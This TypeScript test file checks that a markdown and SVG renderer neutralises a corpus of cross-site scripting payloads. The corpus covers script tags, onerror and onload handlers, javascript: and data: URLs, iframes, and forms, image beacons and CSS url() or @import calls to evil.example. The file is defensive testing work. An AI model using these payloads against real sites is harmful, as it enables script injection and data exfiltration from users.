import { expect, test } from "bun:test";
import { JSDOM } from "jsdom";
import { createRenderer } from "./render";

const win = new JSDOM("").window as unknown as Window & typeof globalThis;
const r = createRenderer(win);

// docs/adr/0068 §4: a fixed corpus that must never yield script, handlers or
// script URLs, whatever the markdown around it.
const corpus = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg><script>alert(1)</script></svg>",
  "<svg onload=alert(1)>",
  '<a href="javascript:alert(1)">x</a>',
  "[x](javascript:alert(1))",
  "[x](JaVaScRiPt:alert(1))",
  "[x](data:text/html,<script>alert(1)</script>)",
  '![x](x" onerror="alert(1))',
  '<iframe src="https://evil.example"></iframe>',
  '<form action="https://evil.example"><button>go</button></form>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  "<details open ontoggle=alert(1)>",
  "```html\n<script>alert(1)</script>\n```",
];

// Inspect the parsed result, not the string: escaped text (&lt;script&gt;) is
// fine, a live element, handler or script URL is not.
function live(html: string): string[] {
  const doc = new JSDOM(`<body>${html}</body>`).window.document;
  const found: string[] = [];
  for (const el of doc.body.querySelectorAll("*")) {
    const tag = el.tagName.toLowerCase();
    if (["script", "iframe", "form", "object", "embed", "foreignobject"].includes(tag) || (tag === "style" && !el.closest("svg"))) found.push(tag);
    for (const a of el.attributes) {
      if (a.name.startsWith("on") || a.name === "style") found.push(`${tag}[${a.name}]`);
      if (/^(href|src|xlink:href|action)$/.test(a.name) && /^\s*(javascript|data|vbscript):/i.test(a.value)) found.push(`${tag}[${a.name}=${a.value}]`);
    }
  }
  return found;
}

test("markdown corpus renders inert", () => {
  for (const md of corpus) {
    const html = r.markdown(md);
    expect({ md, html, live: live(html) }).toEqual({ md, html, live: [] });
  }
});

test("raw HTML shows as text", () => {
  expect(r.markdown("<b>hi</b>")).toContain("&lt;b&gt;hi&lt;/b&gt;");
});

test("links open safely, https kept", () => {
  const html = r.markdown("[docs](https://fleet.bnei.dev/x)");
  expect(html).toContain('href="https://fleet.bnei.dev/x"');
  expect(html).toContain('rel="noopener noreferrer"');
});

test("mermaid stays source until drawn", () => {
  expect(r.markdown("```mermaid\ngraph TD; A-->B\n```")).toContain('class="mermaid-src"');
});

test("svg payloads are stripped", () => {
  for (const svg of [
    "<svg><script>alert(1)</script></svg>",
    '<svg><a href="javascript:alert(1)"><text>x</text></a></svg>',
    "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
    '<svg><g onclick="alert(1)"><rect/></g></svg>',
  ]) {
    const out = r.svg(svg);
    expect({ svg, out, live: live(out) }).toEqual({ svg, out, live: [] });
  }
});

// The checker itself must see what the sanitizer removes, or the tests above
// prove nothing.
test("checker flags raw payloads", () => {
  expect(live('<img src=x onerror=alert(1)><a href="javascript:x">y</a><script>1</script>').length).toBe(3);
});

test("relative links are dropped, images become links", () => {
  const rel = r.markdown("[host](/api/delete?all=1)");
  expect(rel).not.toContain("href=");
  const img = r.markdown("![beacon](https://evil.example/?d=secret)");
  expect(img).not.toContain("<img");
  expect(img).toContain('href="https://evil.example/?d=secret"');
});

test("svg keeps plain style, drops fetching style and images", () => {
  expect(r.svg("<svg><style>.a{fill:red}</style><rect class=\"a\"/></svg>")).toContain("fill:red");
  for (const css of ["background:url(https://evil.example/x)", "@import url(https://evil.example/x.css);"]) {
    expect(r.svg(`<svg><style>.a{${css}}</style><rect/></svg>`)).not.toContain("evil.example");
  }
  expect(r.svg('<svg><image href="https://evil.example/x.png"/></svg>')).not.toContain("evil.example");
});

test("plain attribute values survive (class, viewBox)", () => {
  const out = r.svg('<svg viewBox="4 4 552 141" class="flowchart"><g class="root"><rect width="10"/></g></svg>');
  expect(out).toContain('viewBox="4 4 552 141"');
  expect(out).toContain('class="flowchart"');
  expect(r.markdown("```mermaid\ngraph TD; A-->B\n```")).toContain('class="mermaid-src"');
});

test("svg style may reference its own markers", () => {
  expect(r.svg('<svg><style>.a{marker-end:url(#arrow);fill:url( "#g" )}</style><rect/></svg>')).toContain("url(#arrow)");
  expect(r.svg("<svg><style>.a{fill:url( https://evil.example/x)}</style><rect/></svg>")).not.toContain("evil.example");
  expect(r.svg("<svg><style>.a{fill:url('//evil.example/x')}</style><rect/></svg>")).not.toContain("evil.example");
});
